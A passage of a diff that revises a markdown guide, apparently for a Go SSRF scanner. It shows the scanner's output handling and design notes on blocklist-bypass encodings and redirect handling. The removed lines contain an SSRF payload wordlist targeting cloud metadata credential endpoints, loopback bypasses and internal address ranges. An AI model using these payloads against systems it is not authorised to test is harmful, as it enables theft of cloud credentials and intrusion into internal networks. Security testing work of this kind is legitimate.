+	fmt.Printf("\n[+] Done. %d anomalous response(s) from %d probes.\n",
+		len(hits), len(jobs))
 
 	if *outputPath != "" && len(hits) > 0 {
 		data, err := json.MarshalIndent(hits, "", "  ")
@@ -597,59 +749,35 @@ func main() {
 			fmt.Fprintf(os.Stderr, "write error: %v\n", err)
 			os.Exit(1)
 		}
-		fmt.Printf("Hits written to %s\n", *outputPath)
+		fmt.Printf("[+] Hits written to %s\n", *outputPath)
+	} else if *outputPath != "" {
+		fmt.Println("[*] No hits to write.")
 	}
 }
 ```
 
 **Key design points:**
 
-- `CheckRedirect: func(...) error { return http.ErrUseLastResponse }` — stops the client from following redirects, which is critical because SSRF often manifests as a redirect to an internal resource
-- Baseline is established against a guaranteed-NXDOMAIN URL so any response to internal addresses stands out
-- Anomaly detection uses both status code change and response body size difference (>200 bytes threshold)
-- The wordlist supports common SSRF bypass formats in the payloads themselves:
-  - `http://169.254.169.254/` — AWS/GCP metadata
-  - `http://2130706433/` — decimal representation of 127.0.0.1
-  - `http://0177.0.0.1/` — octal representation of 127.0.0.1
-  - `http://[::1]/` — IPv6 loopback
-  - `http://localhost/` — hostname-based bypass
-
----
-
-## Sample Payload Wordlists
-
-### SSRF Internal Targets (save as `ssrf-payloads.txt`)
-
-```
-# Cloud metadata
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://metadata.google.internal/computeMetadata/v1/
-http://169.254.169.254/metadata/v1/maintenance
-
-# Loopback bypasses
-http://127.0.0.1/
-http://127.0.0.1:8080/
-http://2130706433/
-http://0177.0.0.1/
-http://[::1]/
-http://localhost/
-
-# Common internal ranges
-http://10.0.0.1/
-http://10.0.0.1/admin
-http://192.168.1.1/
-http://172.16.0.1/
-```
+- `expandPayload` generates bypass representations for every IPv4 address found in a payload URL:
+  decimal (`2130706433`), octal (`0177.0.0.1`), hex (`0x7f000001`), IPv6-mapped
+  (`::ffff:127.0.0.1`), and short-form IPv6 (`::1` for loopback) — blocklist bypass coverage
+  without requiring the wordlist author to pre-enumerate all forms
+- `http.ErrUseLastResponse` stops redirect following — SSRF often manifests as a redirect to an
+  internal URL with the Location header exposing the internal address
+- Anomaly detection threshold is 100 bytes to avoid false positives from minor dynamic content
+  differences while still catching non-trivial internal response bodies
+- Baseline uses a guaranteed-NXDOMAIN hostname so any successful probe to an internal address
+  produces a detectably different response
+- Semaphore pattern with buffered channel avoids importing external concurrency libraries
 
 ---
 
 ## Resources
 
 - Go standard library — net/http: https://pkg.go.dev/net/http
-- Go standard library — net: https://pkg.go.dev/net
-- go-smb2 (hirochachacha): https://github.com/hirochachacha/go-smb2
-- golang.org/x/sys: https://pkg.go.dev/golang.org/x/sys
-- golang.org/x/sys/windows: https://pkg.go.dev/golang.org/x/sys/windows
-- Go cross-compilation docs: https://pkg.go.dev/cmd/go#hdr-Environment_variables
+- Go standard library — net (DialTimeout): https://pkg.go.dev/net#DialTimeout
+- go-smb2 (hirochachacha) — pure-Go SMB2 library: https://github.com/hirochachacha/go-smb2
+- golang.org/x/sys — low-level OS interfaces: https://pkg.go.dev/golang.org/x/sys
+- golang.org/x/sys/windows — Windows-specific syscalls: https://pkg.go.dev/golang.org/x/sys/windows
+- Go cross-compilation guide: https://pkg.go.dev/cmd/go#hdr-Environment_variables
 - OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
